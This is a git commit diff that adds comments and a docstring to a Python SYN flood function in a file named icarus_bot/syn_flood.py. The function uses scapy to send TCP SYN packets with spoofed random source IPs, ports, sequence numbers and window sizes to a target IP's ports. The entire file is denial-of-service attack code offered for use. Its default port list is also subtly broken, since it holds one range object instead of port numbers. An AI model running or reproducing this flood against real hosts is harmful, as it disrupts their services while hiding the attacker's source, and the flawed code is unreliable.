ba23ab5167c6a6c3788d1415edd945d6b56d906b
L-Bain <larrybain01@gmail.com>
2022-05-16 22:41:27 +1000

    Commenting update for SYN Flood file

--- icarus_bot/syn_flood.py
+++ icarus_bot/syn_flood.py
@@ -3,6 +3,7 @@ import random
 from scapy.all import IP, TCP, send
 
 def randomIP():
+    # Generates spoofed IP value for SYN packet
 	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
 	return ip
 
@@ -10,30 +11,37 @@ def randInt():
 	x = random.randint(1000,9000)
 	return x
 
-def SYN_Flood(targetIP, numPackets, ports=None):
-    if ports == None:
-        ports = [range(3, 65535)]
+def SYN_Flood(targetIP, numPackets, ports=[range(3, 65535)]):
+    """
+    SYN Flood attack function
+
+    Parameters:
+    targetIP (str) : IP to run SYN Flood attack on
+    numPackets (int) : Number of SYN packets to send to each port
+    ports (List[int]) : Optional list of ports to send SYN packets to
+    """
     
     # Loop over number of packets to send to each port
     for i in range(numPackets):
         # Generate spoofed TCP packet values
-        s_port = randInt()
-        s_eq = randInt()
-        w_indow = randInt()
+        spoof_port = randInt()
+        spoof_eq = randInt()
+        spoof_window = randInt()
         
         # Loop over each specified port
         for port in ports:
-            # Generate spoofed IP values
+            # Create spoofed IP packet
             IP_Packet = IP()
             IP_Packet.src = randomIP()
             IP_Packet.dst = targetIP
 
+            # Create spoofed TCP Packet
             TCP_Packet = TCP()	
-            TCP_Packet.sport = s_port
+            TCP_Packet.sport = spoof_port
             TCP_Packet.dport = port
             TCP_Packet.flags = "S"
-            TCP_Packet.seq = s_eq
-            TCP_Packet.window = w_indow
+            TCP_Packet.seq = spoof_eq
+            TCP_Packet.window = spoof_window
 
             # Send spoofed TCP SYN packet
             send(IP_Packet/TCP_Packet, verbose=0)
